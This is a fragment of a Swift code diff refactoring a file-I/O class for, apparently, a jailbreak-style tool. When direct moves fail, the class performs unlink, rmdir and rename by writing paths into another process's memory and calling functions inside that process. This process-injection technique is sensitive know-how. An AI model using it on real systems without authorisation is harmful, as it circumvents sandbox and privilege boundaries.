+        pathBytes.withUnsafeBytes { rc.remote_write(trojan, from: $0.baseAddress, size: UInt64(pathBytes.count)) }
+        let ul = Int32(bitPattern: UInt32(callIn(rc: rc, name: "unlink", args: [trojan]) & 0xFFFFFFFF))
         if ul == 0 { return (true, "\(process) unlink ok") }
-
-        let rd = Int32(bitPattern: UInt32(callIn(rc: rc, name: "rmdir", args: [trojanMem]) & 0xFFFFFFFF))
+        let rd = Int32(bitPattern: UInt32(callIn(rc: rc, name: "rmdir",  args: [trojan]) & 0xFFFFFFFF))
         if rd == 0 { return (true, "\(process) rmdir ok") }
-
         return (false, "unlink errno=\(ul) rmdir errno=\(rd)")
     }
 
-    // MARK: - Move / Rename
-
-    /// Rename or move a file/directory using the best available method.
     func move(from srcPath: String, to dstPath: String) -> RCIOResult {
         let start = Date()
-
-        // Tier 1: FileManager
         if (try? FileManager.default.moveItem(atPath: srcPath, toPath: dstPath)) != nil {
             let r = RCIOResult(ok: true, tier: .direct, process: nil, bytes: 0,
                                duration: -start.timeIntervalSinceNow,
-                               message: "ok (direct move)",
-                               diagnostic: "FileManager.moveItem succeeded")
-            appendLog(op: "move", path: srcPath, result: r)
-            return r
+                               message: "ok (direct move)", diagnostic: "FileManager.moveItem succeeded")
+            appendLog(op: "move", path: srcPath, result: r); return r
         }
-
-        // Tier 2: RemoteCall rename(2) — pack both paths into trojanMem consecutively
-        let best = rcBestProcess(for: srcPath)
-        var candidates = [best]
-        for proc in Self.fallbackOrder where proc != best { candidates.append(proc) }
-
-        for proc in candidates {
+        for proc in buildCandidates(for: srcPath) {
             poolLock.lock()
             let state = pool[proc]?.state
             let rc    = pool[proc]?.rc
             poolLock.unlock()
             guard case .ready = state, let rc else { continue }
-
-            let trojanMem = rc.trojanMem
-            guard trojanMem != 0 else { continue }
-
+            let trojan = rc.trojanMem; guard trojan != 0 else { continue }
             let srcBytes = Array((srcPath + "\0").utf8)
             let dstBytes = Array((dstPath + "\0").utf8)
             let srcLen   = UInt64(srcBytes.count)
-
-            srcBytes.withUnsafeBytes { rc.remote_write(trojanMem, from: $0.baseAddress, size: srcLen) }
-            let dstAddr = trojanMem + srcLen
+            srcBytes.withUnsafeBytes { rc.remote_write(trojan, from: $0.baseAddress, size: srcLen) }
+            let dstAddr = trojan + srcLen
             dstBytes.withUnsafeBytes { rc.remote_write(dstAddr, from: $0.baseAddress, size: UInt64(dstBytes.count)) }
-
-            let ret = Int32(bitPattern: UInt32(callIn(rc: rc, name: "rename", args: [trojanMem, dstAddr]) & 0xFFFFFFFF))
+            let ret = Int32(bitPattern: UInt32(callIn(rc: rc, name: "rename", args: [trojan, dstAddr]) & 0xFFFFFFFF))
             if ret == 0 {
                 let r = RCIOResult(ok: true, tier: .remoteCall, process: proc, bytes: 0,
                                    duration: -start.timeIntervalSinceNow,
-                                   message: "ok (rc:\(proc) renamed)",
-                                   diagnostic: "\(proc) rename ok")
-                appendLog(op: "move", path: srcPath, result: r)
-                return r
+                                   message: "ok (rc:\(proc) renamed)", diagnostic: "\(proc) rename ok")
+                appendLog(op: "move", path: srcPath, result: r); return r
             }
         }
-
         let r = RCIOResult.failure("move failed", duration: -start.timeIntervalSinceNow)
-        appendLog(op: "move", path: srcPath, result: r)
-        return r
+        appendLog(op: "move", path: srcPath, result: r); return r
     }
 
     // MARK: - Private helpers
 
-    private func markInitializing(process: String) {
+    private func markPoolState(_ process: String, _ state: RCPoolEntry.State) {
         poolLock.lock()
-        pool[process] = RCPoolEntry(process: process, state: .initializing, rc: nil)
+        pool[process] = RCPoolEntry(process: process, state: state, rc: pool[process]?.rc)
         poolLock.unlock()
-        DispatchQueue.main.async { self.objectWillChange.send() }
+        publish()
+    }
+
+    private func markInitializing(process: String) {
+        markPoolState(process, .initializing)
     }
 
     private func markFailed(process: String, reason: String) {
-        poolLock.lock()
-        pool[process] = RCPoolEntry(process: process, state: .failed(reason: reason), rc: nil)
-        poolLock.unlock()
-        DispatchQueue.main.async { self.objectWillChange.send() }
+        markPoolState(process, .failed(reason: reason))
         mgr.logmsg("(rcio) \(process) failed: \(reason)")
+    }
+
+    private func publish() {
+        DispatchQueue.main.async { self.objectWillChange.send() }
     }
 
     private func appendLog(op: String, path: String, result: RCIOResult) {
@@ -700,13 +680,13 @@ final class RemoteFileIO: ObservableObject {
     }
 }
 
-// MARK: - Convenience formatters
+// MARK: - Formatters
 
 extension Int64 {
     var fileSizeString: String {
         guard self >= 0 else { return "—" }
-        if self < 1024 { return "\(self) B" }
-        if self < 1024 * 1024 { return String(format: "%.1f KB", Double(self) / 1024) }
+        if self < 1024          { return "\(self) B" }
+        if self < 1024 * 1024   { return String(format: "%.1f KB", Double(self) / 1024) }
         return String(format: "%.1f MB", Double(self) / (1024 * 1024))
     }
 }
